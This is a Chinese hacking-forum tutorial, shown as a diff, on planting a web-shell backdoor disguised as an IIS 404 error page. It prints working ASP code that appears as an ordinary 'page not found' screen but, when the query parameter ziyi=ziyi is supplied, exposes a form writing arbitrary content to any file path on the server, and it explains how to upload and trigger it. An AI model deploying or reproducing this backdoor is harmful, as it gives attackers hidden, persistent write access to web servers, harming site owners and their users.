@@ -1,0 +1,68 @@
+一个隐藏的404错误页后门
+Author:子↘仪
+Team:饭客渗透小组
+Blog:http://hi.baidu.com/%E6%DE%D2%C7
+
+上次老饭发了一个百度错误页的后门，试用了一下，感觉非常不错(如图1，2)，隐藏性也很强，唯一
+
+美中不足的是一般网站不会存在百度错误页的。当管理员访问这个后门时，虽然不能发现
+
+这是个小马，至少会有点怀疑。于是自制了一个IIS404错误页面后门，来弥补这个缺憾。
+
+  下载 (38.45 KB)
+
+2010-2-24 13:47  下载 (54.56 KB)
+
+2010-2-24 13:47
+
+
+
+
+当我们访问一个不存在的页面时，经常会出现如下这个页面。
+  下载 (40.57 KB)
+
+2010-2-24 13:47
+
+我们可以在这个页面中添加个后门，方法很简单。先将这个页面的源代码复制出来，保存到1.asp中
+
+在1.asp的开头加上这么一段
+
+<% if request("ziyi")="ziyi" then %>
+<title>Baidu - your visit gone wrong</title>
+<%="<br>"%>
+<%="The file location："+server.mappath(request.servervariables("script_name"))%>
+<%Dim objFSO%>
+<%Dim fdata%>
+<%Dim objCountFile%>
+<%on error resume next%>
+<%Set objFSO = Server.CreateObject("Scripting.FileSystemObject")%>
+<%if Trim(request("syfdpath"))<>"" then%>
+<%fdata = request("cyfddata")%>
+<%Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)%>
+<%objCountFile.Write fdata%>
+<%if err =0 then%>
+<font color=red>save!</font>
+<%end if%>
+<%end if%>
+<%objCountFile.Close%>
+<%Set objCountFile=Nothing%>
+<%Set objFSO = Nothing%>
+<form action='' method=post>
+<p>
+    <input type=text name=syfdpath width=32 value="<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>" style="border:solid 1px" size=80>
+</p>
+<p>
+      <textarea name=cyfddata cols=80 rows=10 width=32 style="border:solid 1px"></textarea>
+</p>
+    <input type=submit value=save style="border:solid 1px">
+    <font color="#FF0000"><strong>                                    子↘仪专用</strong></font> </p>
+</form><form action="" method="post">
+<% end if %>
+
+一个简单的后门就产生了。
+
+我再来说一下使用方法。首先就是要将这个1.asp传到网站下，当访问时出现仍然是图3的界面，提示
+
+无法找到该页，别急，页面是存在的，这个只不过是个伪装罢了。在地址栏中1.asp后面加上?ziyi=ziyi，
+
+回车后就会出现我们可爱的小马了转载请注明出自凡窝电脑技术 -   http://bbs.hackfans.com.cn/,本贴地址:http://bbs.hackfans.com.cn/viewthread.php?tid=74704
